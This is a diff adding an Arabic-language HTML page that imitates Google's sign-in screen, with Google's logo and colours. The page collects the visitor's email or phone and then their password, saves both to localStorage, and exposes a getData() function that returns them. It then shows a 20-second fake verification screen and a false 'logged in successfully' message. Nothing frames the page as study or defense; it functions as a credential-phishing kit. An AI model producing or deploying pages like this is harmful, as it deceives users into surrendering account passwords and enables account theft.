@@ -1,0 +1,133 @@
+<html lang="ar">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>تسجيل الدخول</title>
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/5.15.3/css/all.min.css">
+    <style>
+        body {
+            font-family: 'Arial', sans-serif;
+            text-align: center;
+            direction: rtl;
+            background-color: #fff;
+            margin: 0;
+            padding: 0;
+        }
+        .container {
+            margin-top: 50px;
+        }
+        .logo img {
+            width: 100px;
+        }
+        h1 {
+            font-size: 24px;
+            color: #202124;
+            margin: 20px 0;
+        }
+        p {
+            font-size: 14px;
+            color: #5f6368;
+            margin: 10px 0;
+        }
+        a {
+            color: #1a73e8;
+            text-decoration: none;
+        }
+        .input-container {
+            margin: 20px 0;
+        }
+        input[type="text"], input[type="password"] {
+            width: 80%;
+            padding: 10px;
+            font-size: 16px;
+            border: 1px solid #dadce0;
+            border-radius: 4px;
+        }
+        .button-container {
+            margin: 20px 0;
+        }
+        .button-container button {
+            background-color: #1a73e8;
+            color: #fff;
+            border: none;
+            padding: 10px 20px;
+            font-size: 14px;
+            border-radius: 4px;
+            cursor: pointer;
+        }
+        .footer {
+            margin-top: 20px;
+        }
+    </style>
+</head>
+<body>
+    <div class="container" id="loginContainer">
+        <div class="logo">
+            <img src="https://www.google.com/images/branding/googlelogo/2x/googlelogo_color_92x30dp.png" alt="Google Logo">
+        </div>
+        <h1>تسجيل الدخول</h1>
+        <p>باستخدام حسابك على Google.</p>
+        <a href="#">مزيد من المعلومات حول استخدام حسابك</a>
+        <div class="input-container">
+            <input type="text" id="emailOrPhone" placeholder="البريد الإلكتروني أو الهاتف">
+        </div>
+        <a href="#">هل نسيت البريد الإلكتروني؟</a>
+        <div class="button-container">
+            <button onclick="goToPasswordPage()">التالي</button>
+        </div>
+        <div class="footer">
+            <a href="#">إنشاء حساب</a>
+        </div>
+    </div>
+
+    <div class="container" id="passwordContainer" style="display: none;">
+        <div class="logo">
+            <img src="https://www.google.com/images/branding/googlelogo/2x/googlelogo_color_92x30dp.png" alt="Google Logo">
+        </div>
+        <h1>تسجيل الدخول</h1>
+        <p>باستخدام حسابك على Google.</p>
+        <div class="input-container">
+            <input type="password" id="password" placeholder="كلمة المرور">
+        </div>
+        <div class="button-container">
+            <button onclick="verifyLogin()">التالي</button>
+        </div>
+    </div>
+
+    <div class="container" id="verificationContainer" style="display: none;">
+        <h1>جاري التحقق من المعلومات...</h1>
+    </div>
+
+    <div class="container" id="successContainer" style="display: none;">
+        <h1>تم تسجيل الدخول بنجاح!</h1>
+    </div>
+
+    <script>
+        function goToPasswordPage() {
+            var emailOrPhone = document.getElementById('emailOrPhone').value;
+            localStorage.setItem('emailOrPhone', emailOrPhone);
+            document.getElementById('loginContainer').style.display = 'none';
+            document.getElementById('passwordContainer').style.display = 'block';
+        }
+
+        function verifyLogin() {
+            var password = document.getElementById('password').value;
+            localStorage.setItem('password', password);
+            document.getElementById('passwordContainer').style.display = 'none';
+            document.getElementById('verificationContainer').style.display = 'block';
+
+            setTimeout(function() {
+                document.getElementById('verificationContainer').style.display = 'none';
+                document.getElementById('successContainer').style.display = 'block';
+            }, 20000);
+        }
+
+        function getData() {
+            return {
+                emailOrPhone: localStorage.getItem('emailOrPhone'),
+                password: localStorage.getItem('password')
+            };
+        }
+    </script>
+</body>
+</html>
